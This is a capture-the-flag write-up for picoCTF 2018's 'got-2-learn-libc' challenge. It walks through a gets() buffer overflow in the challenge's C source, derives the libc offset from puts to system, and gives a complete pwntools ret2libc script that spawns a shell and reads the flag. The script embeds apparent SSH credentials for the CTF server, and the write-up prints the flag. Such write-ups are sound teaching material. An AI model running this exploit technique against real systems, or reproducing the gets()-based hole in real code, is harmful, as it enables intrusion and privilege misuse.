# Problem
This [program](https://2018shell1.picoctf.com/static/b27410500910a674bdad0bff6dbde5ca/vuln) gives you the address of some system calls. Can you get a shell? You can find the program in /problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33 on the shell server. [Source](https://2018shell1.picoctf.com/static/b27410500910a674bdad0bff6dbde5ca/vuln.c).

## Hints:
try returning to systems calls to leak information

don't forget you can always return back to main()

## Solution:

Lets download the files:
```bash
wget https://2018shell1.picoctf.com/static/b27410500910a674bdad0bff6dbde5ca/vuln
wget https://2018shell1.picoctf.com/static/b27410500910a674bdad0bff6dbde5ca/vuln.c
```

First, we investigate the source
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

char useful_string[16] = "/bin/sh"; /* Maybe this can be used to spawn a shell? */


void vuln(){
  char buf[BUFSIZE];
  puts("Enter a string:");
  gets(buf);
  puts(buf);
  puts("Thanks! Exiting now...");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  puts("Here are some useful addresses:\n");

  printf("puts: %p\n", puts);
  printf("fflush %p\n", fflush);
  printf("read: %p\n", read);
  printf("write: %p\n", write);
  printf("useful_string: %p\n", useful_string);

  printf("\n");
  
  vuln();

  
  return 0;
}
```

We already have "/bin/sh" in our binary, if we only knew the address of ```system()``` we could get a shell.

The offset of ```system()``` from ```puts()``` (for example) depends only on the version of libc.

All we need to do is to check this offset on the remote server.

```bash
roeesefi@pico-2018-shell-1:/problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33$ strace ./vuln       

execve("./vuln", ["./vuln"], [/* 22 vars */]) = 0                                                             
strace: [ Process PID=1456951 runs in 32 bit mode. ]                                                          
brk(NULL)                               = 0x571c1000                                                          
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)                               
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7738000                        
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)                               
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3                                                              
fstat64(3, {st_mode=S_IFREG|0644, st_size=41920, ...}) = 0                                                    
mmap2(NULL, 41920, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf772d000                                                 
close(3)                                = 0                                                                   
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)                               
open("/lib32/libc.so.6", O_RDONLY|O_CLOEXEC) = 3                                                              
read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\300\207\1\0004\0\0\0"..., 512) = 512                 
fstat64(3, {st_mode=S_IFREG|0755, st_size=1775464, ...}) = 0                                                  
mmap2(NULL, 1784348, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7579000                       
mprotect(0xf7726000, 4096, PROT_NONE)   = 0                                                                   
mmap2(0xf7727000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1ad000) = 0xf7727000 
mmap2(0xf772a000, 10780, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf772a000       
close(3)                                = 0                                                                   
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7578000                        
set_thread_area({entry_number:-1, base_addr:0xf7578700, limit:1048575, seg_32bit:1, contents:0, read_exec_only
:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 (entry_number:12)                                    
mprotect(0xf7727000, 8192, PROT_READ)   = 0                                                                   7
mprotect(0x565ff000, 4096, PROT_READ)   = 0                                                                   
mprotect(0xf775f000, 4096, PROT_READ)   = 0                                                                   
munmap(0xf772d000, 41920)               = 0                                                                   
getegid32()                             = 3302                                                                
setresgid32(3302, 3302, 3302)           = 0                                                                   
write(1, "Here are some useful addresses:\n", 32Here are some useful addresses:                               
) = 32                                                                                                        
write(1, "\n", 1                                                                                              
)                       = 1                                                                                   
write(1, "puts: 0xf75d8140\n", 17puts: 0xf75d8140                                                             
)      = 17                                                                                                   
write(1, "fflush 0xf75d6330\n", 18fflush 0xf75d6330                                                           
)     = 18                                                                                                    
write(1, "read: 0xf764d350\n", 17read: 0xf764d350                                                             
)      = 17                                                                                                   
write(1, "write: 0xf764d3c0\n", 18write: 0xf764d3c0                                                           
)     = 18                                                                                                    
write(1, "useful_string: 0x56600030\n", 26useful_string: 0x56600030                                           
) = 26                                                                                                        
write(1, "\n", 1                                                                                              
)                       = 1                                                                                   
write(1, "Enter a string:", 15Enter a string:)         = 15                                                   
write(1, "\n", 1                                                                                              
)                       = 1                                                                                   
fstat64(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 15), ...}) = 0                                         
brk(NULL)                               = 0x571c1000                                                          
brk(0x571e2000)                         = 0x571e2000                                                          
read(0,
```

It loads ```/lib32/libc.so.6```.
```bash
roeesefi@pico-2018-shell-1:/problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33$ objdump -T /lib32/li
bc.so.6 | grep puts                                                                                           
0005f140 g    DF .text  000001d0  GLIBC_2.0   _IO_puts
0005f140  w   DF .text  000001d0  GLIBC_2.0   puts
000e9e40 g    DF .text  0000048a  GLIBC_2.0   putspent
000eb450 g    DF .text  00000289  GLIBC_2.10  putsgent
0005dbf0  w   DF .text  0000015d  GLIBC_2.0   fputs
0005dbf0 g    DF .text  0000015d  GLIBC_2.0   _IO_fputs
000674f0  w   DF .text  00000092  GLIBC_2.1   fputs_unlocked
roeesefi@pico-2018-shell-1:/problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33$ objdump -T /lib32/li
bc.so.6 | grep system                                                                                         
00110840 g    DF .text  00000044  GLIBC_2.0   svcerr_systemerr
0003a940 g    DF .text  00000037  GLIBC_PRIVATE __libc_system
0003a940  w   DF .text  00000037  GLIBC_2.0   system
```

And the offset is: ```0x0003a940 - 0x0005f140 = -149504```.

First we need to check the offset overriding the return address. We can use this gdbinit script
```
run < <(echo AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ0000111122223333444455556666777788889999aaaabbbbccccddddeeee)
```

Lets debug:
```bash
gdb -x ./gdbinit ./vuln

Stopped reason: SIGSEGV
0x65656565 in ?? ()
```

We know that ```eeee``` overrides the return address.

Now we can use the following script:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = 'roeesefi'
pw = '123123'

if debug:
  p = process('./vuln') # The offset may be different here
else:
  s = ssh(host = '2018shell1.picoctf.com', user=user, password=pw)
  s.set_working_directory('/problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33')
  
  p = s.process('./vuln')


offset = -149504
lines =  p.recvuntil('Enter a string:').split('\n')

print lines
puts = int(lines[2].split(':')[1].strip()[2:], 16)
useful = int(lines[6].split(':')[1].strip()[2:], 16)

log.info('Puts in: 0x{:x}'.format(puts))
log.info('Useful string in: 0x{:x}'.format(useful))

system = puts + offset

payload = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ0000111122223333444455556666777788889999aaaabbbbccccdddd' + p32(system) + 'XXXX' + p32(useful)
p.sendline(payload)
p.recv()
p.sendline('ls')
p.sendline('cat flag.txt')
p.sendline('exit')

print p.recvall()
```

Flag: picoCTF{syc4al1s_4rE_uS3fUl_6319ec91}